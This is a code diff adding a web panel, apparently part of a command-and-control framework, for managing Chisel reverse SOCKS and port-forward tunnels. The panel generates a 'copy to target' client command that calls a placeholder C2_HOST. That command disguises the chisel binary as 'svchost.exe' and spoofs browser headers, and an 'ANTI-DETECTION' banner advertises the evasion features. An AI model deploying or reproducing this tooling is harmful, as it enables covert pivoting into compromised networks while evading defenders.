@@ -1,0 +1,303 @@
+<style>
+    .prts-btn {
+        background: rgba(125, 142, 142, 0.1);
+        border: 1px solid rgba(125, 142, 142, 0.3);
+        color: var(--accent);
+        padding: 8px 16px;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 11px;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    .prts-btn:hover { background: rgba(125, 142, 142, 0.2); border-color: var(--accent); }
+    .prts-input {
+        background: rgba(0,0,0,0.3);
+        border: 1px solid rgba(125,142,142,0.2);
+        color: #fff;
+        padding: 8px 12px;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 12px;
+        width: 100%;
+    }
+    .prts-input:focus { outline: none; border-color: var(--accent); }
+    .prts-select {
+        background: rgba(0,0,0,0.3);
+        border: 1px solid rgba(125,142,142,0.2);
+        color: #fff;
+        padding: 8px 12px;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 12px;
+        width: 100%;
+    }
+    .prts-select:focus { outline: none; border-color: var(--accent); }
+    .prts-table { width: 100%; border-collapse: collapse; font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+    .prts-table th { padding: 10px 15px; text-align: left; color: var(--accent); border-bottom: 1px solid rgba(125,142,142,0.2); font-size: 10px; letter-spacing: 1px; }
+    .prts-table td { padding: 10px 15px; border-bottom: 1px solid rgba(255,255,255,0.04); }
+    .action-bar { display: flex; gap: 10px; margin-bottom: 20px; }
+    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(15px); z-index: 2001; align-items: center; justify-content: center; }
+    .modal .modal-content { width: 95%; max-width: 500px; background: #0a0a0a; border: 1px solid var(--accent); padding: 25px; }
+    .close-modal { cursor: pointer; font-size: 20px; color: var(--accent); float: right; }
+    .cmd-box {
+        background: #000;
+        border: 1px solid rgba(125,142,142,0.2);
+        padding: 12px 15px;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 11px;
+        color: var(--success);
+        word-break: break-all;
+        position: relative;
+        margin-top: 10px;
+        line-height: 1.5;
+    }
+    .copy-btn {
+        position: absolute; top: 6px; right: 6px;
+        background: rgba(125,142,142,0.2);
+        border: 1px solid rgba(125,142,142,0.3);
+        color: var(--accent);
+        padding: 3px 8px;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 9px;
+        cursor: pointer;
+    }
+    .copy-btn:hover { background: rgba(125,142,142,0.4); }
+    .evasion-tag {
+        display: inline-block;
+        padding: 2px 6px;
+        font-size: 9px;
+        border: 1px solid;
+        margin-right: 4px;
+        margin-bottom: 2px;
+    }
+</style>
+
+<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; flex-wrap:wrap; gap:10px;">
+    <div class="section-header" style="margin-bottom:0;">
+        <h3>Chisel Tunnel // Proxy Management</h3>
+    </div>
+</div>
+
+<!-- Evasion info banner -->
+<div style="padding:10px 14px; background:rgba(26,26,26,0.6); border:1px solid var(--border); margin-bottom:15px; font-family:'JetBrains Mono'; font-size:10px; display:flex; flex-wrap:wrap; align-items:center; gap:4px;">
+    <span style="color:var(--accent);">ANTI-DETECTION:</span>
+    <span class="evasion-tag" style="color:#4CAF50; border-color:#4CAF50;">RANDOM_WS_PATH</span>
+    <span class="evasion-tag" style="color:#2196F3; border-color:#2196F3;">CUSTOM_HEADERS</span>
+    <span class="evasion-tag" style="color:#ff9800; border-color:#ff9800;">UNIQUE_AUTH</span>
+    <span class="evasion-tag" style="color:#9c27b0; border-color:#9c27b0;">NO_DEFAULT_FINGERPRINT</span>
+    <span style="color:#555; margin-left:6px;">// chisel in ./tools/</span>
+</div>
+
+<div class="action-bar" style="flex-wrap:wrap;">
+    <button class="prts-btn" onclick="document.getElementById('create-proxy-modal').style.display='flex'">
+        [+] CREATE_TUNNEL
+    </button>
+    <button class="prts-btn" onclick="fetchProxies()">
+        [R] REFRESH
+    </button>
+</div>
+
+<div class="data-grid" style="overflow-x:auto;">
+    <table class="prts-table" style="min-width:700px;">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>TYPE</th>
+                <th>PORT</th>
+                <th>WS_PATH</th>
+                <th>STATUS</th>
+                <th>PID</th>
+                <th>CREATED</th>
+                <th>ACTIONS</th>
+            </tr>
+        </thead>
+        <tbody id="proxy-list-body">
+            <tr><td colspan="8" style="text-align:center; color:#444; padding:30px;">LOADING...</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- Client command display -->
+<div id="proxy-client-cmd-area" style="display:none; margin-top:20px;">
+    <div class="section-header"><h3>Deploy Command // Copy to Target</h3></div>
+    <div id="proxy-client-cmd" class="cmd-box"></div>
+</div>
+
+<!-- Create Modal -->
+<div id="create-proxy-modal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="document.getElementById('create-proxy-modal').style.display='none'">&times;</span>
+        <h3 style="font-family:'JetBrains Mono'; color:var(--accent); margin-bottom:20px;">>> NEW_CHISEL_TUNNEL</h3>
+        <form onsubmit="event.preventDefault(); createProxy();">
+            <div style="margin-bottom:12px;">
+                <label style="font-family:'JetBrains Mono'; font-size:10px; color:#888; display:block; margin-bottom:5px;">TUNNEL_TYPE:</label>
+                <select id="proxy-type" class="prts-select" onchange="updateRemoteHint()">
+                    <option value="chisel_reverse_socks">Reverse SOCKS5 Proxy</option>
+                    <option value="chisel_reverse_port">Reverse Port Forward</option>
+                </select>
+            </div>
+            <div style="margin-bottom:12px;">
+                <label style="font-family:'JetBrains Mono'; font-size:10px; color:#888; display:block; margin-bottom:5px;">LISTEN_PORT:</label>
+                <input type="number" id="proxy-port" class="prts-input" value="1080" required>
+            </div>
+            <div id="remote-str-group" style="margin-bottom:12px; display:none;">
+                <label style="font-family:'JetBrains Mono'; font-size:10px; color:#888; display:block; margin-bottom:5px;">REMOTE_SPEC: <span id="remote-hint" style="color:#555;"></span></label>
+                <input type="text" id="proxy-remote" class="prts-input" placeholder="e.g. R:8080:10.0.0.1:80">
+            </div>
+            <div style="margin-bottom:12px;">
+                <label style="font-family:'JetBrains Mono'; font-size:10px; color:#888; display:block; margin-bottom:5px;">CLIENT_ID (optional):</label>
+                <input type="text" id="proxy-client-id" class="prts-input" placeholder="Associate with a beacon">
+            </div>
+            <div style="margin-top:15px;">
+                <button type="submit" class="prts-btn" style="width:100%;">DEPLOY_TUNNEL</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+(function() {
+    window.updateRemoteHint = function() {
+        const type = document.getElementById('proxy-type').value;
+        const remoteGroup = document.getElementById('remote-str-group');
+        const hint = document.getElementById('remote-hint');
+        if (type === 'chisel_reverse_port') {
+            remoteGroup.style.display = 'block';
+            hint.textContent = '(e.g. R:8080:10.0.0.1:80)';
+        } else {
+            remoteGroup.style.display = 'none';
+        }
+    };
+
+    window.fetchProxies = async function() {
+        try {
+            const resp = await fetch('/api/proxies', { headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+            const result = await resp.json();
+            const tbody = document.getElementById('proxy-list-body');
+            if (!tbody) return;
+            const proxies = result.data || [];
+            if (proxies.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; color:#444; padding:30px;">NO_ACTIVE_TUNNELS</td></tr>';
+                return;
+            }
+            tbody.innerHTML = proxies.map(p => {
+                const statusColor = p.status === 'running' ? 'var(--success)' : (p.status === 'dead' ? 'var(--danger)' : '#ff9800');
+                const typeLabel = {
+                    'chisel_reverse_socks': 'REV_SOCKS5',
+                    'chisel_reverse_port': 'REV_PORT_FWD',
+                    'chisel_forward': 'FORWARD',
+                }[p.type] || p.type.toUpperCase();
+                return `
+                <tr>
+                    <td style="color:var(--accent); max-width:120px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${p.id}">${p.id.length > 12 ? p.id.substring(0,12)+'...' : p.id}</td>
+                    <td>${typeLabel}</td>
+                    <td>${p.listen_port}</td>
+                    <td style="color:#555; font-size:10px;">${p.ws_path || '-'}</td>
+                    <td style="color:${statusColor};">${(p.status || 'unknown').toUpperCase()}</td>
+                    <td style="color:#555;">${p.pid || '-'}</td>
+                    <td style="color:#666; font-size:10px;">${new Date(p.created_at).toLocaleString()}</td>
+                    <td>
+                        <button class="prts-btn" style="font-size:10px; padding:3px 8px; margin-right:4px;" onclick="showClientCmd('${p.id}')" title="Show deploy command"><i class="fas fa-terminal"></i></button>
+                        <button class="prts-btn" style="font-size:10px; padding:3px 8px;" onclick="deleteProxy('${p.id}')"><i class="fas fa-trash" style="color:var(--danger);"></i></button>
+                    </td>
+                </tr>
+            `}).join('');
+        } catch(e) { console.error(e); }
+    };
+
+    window.showClientCmd = function(proxyId) {
+        // Find proxy in cached data or refetch
+        fetch('/api/proxies', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
+            .then(r => r.json())
+            .then(result => {
+                const proxies = result.data || [];
+                const p = proxies.find(x => x.id === proxyId);
+                if (!p) return;
+
+                const binName = 'svchost.exe';
+                let cmd = '';
+                const wsPath = p.ws_path || '/ws';
+                const auth = p.auth_key || '';
+                const port = p.listen_port || 0;
+
+                cmd = binName + ' client'
+                    + ' --auth "' + auth + '"'
+                    + ' --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'
+                    + ' --header "Accept: text/html,*/*"'
+                    + ' http://C2_HOST:' + port + wsPath;
+
+                if (p.type === 'chisel_reverse_socks') {
+                    cmd += ' R:socks';
+                } else if (p.remote_str) {
+                    cmd += ' ' + p.remote_str;
+                }
+
+                const area = document.getElementById('proxy-client-cmd-area');
+                const box = document.getElementById('proxy-client-cmd');
+                area.style.display = 'block';
+                box.innerHTML = '<button class="copy-btn" onclick="copyCmd(this)">COPY</button>'
+                    + '<span style="color:#555;">// Replace C2_HOST with your server IP</span>\n'
+                    + '<span style="color:#555;">// Rename chisel binary to: ' + binName + '</span>\n\n'
+                    + escapeHtml(cmd);
+            });
+    };
+
+    window.copyCmd = function(btn) {
+        const box = btn.parentElement;
+        const text = box.textContent.replace('COPY', '').trim();
+        navigator.clipboard.writeText(text.split('\n').pop());
+        btn.textContent = 'COPIED!';
+        setTimeout(() => { btn.textContent = 'COPY'; }, 1500);
+    };
+
+    function escapeHtml(str) {
+        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    }
+
+    window.createProxy = async function() {
+        const body = {
+            type: document.getElementById('proxy-type').value,
+            listen_port: parseInt(document.getElementById('proxy-port').value),
+            remote_str: document.getElementById('proxy-remote').value || '',
+            client_id: document.getElementById('proxy-client-id').value || '',
+        };
+        try {
+            const resp = await fetch('/api/proxies', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                body: JSON.stringify(body)
+            });
+            const result = await resp.json();
+            if (result.status === 'success') {
+                document.getElementById('create-proxy-modal').style.display = 'none';
+                showNotification('TUNNEL_DEPLOYED: ' + (result.data.proxy ? result.data.proxy.id : ''));
+                fetchProxies();
+
+                // Show the client command
+                if (result.data.client_cmd) {
+                    const area = document.getElementById('proxy-client-cmd-area');
+                    const box = document.getElementById('proxy-client-cmd');
+                    area.style.display = 'block';
+                    box.innerHTML = '<button class="copy-btn" onclick="copyCmd(this)">COPY</button>'
+                        + '<span style="color:#555;">// ' + (result.data.deploy_tip || '') + '</span>\n'
+                        + '<span style="color:#555;">// Rename chisel binary to match the command</span>\n\n'
+                        + escapeHtml(result.data.client_cmd);
+                }
+            } else {
+                showNotification('ERROR: ' + result.message);
+            }
+        } catch(e) { showNotification('ERROR: ' + e.message); }
+    };
+
+    window.deleteProxy = async function(id) {
+        if (!confirm('TERMINATE this tunnel?')) return;
+        try {
+            const resp = await fetch('/api/proxies/' + id, { method: 'DELETE', headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+            const result = await resp.json();
+            showNotification(result.message);
+            fetchProxies();
+        } catch(e) { showNotification('ERROR: ' + e.message); }
+    };
+
+    fetchProxies();
+    updateRemoteHint();
+})();
+</script>
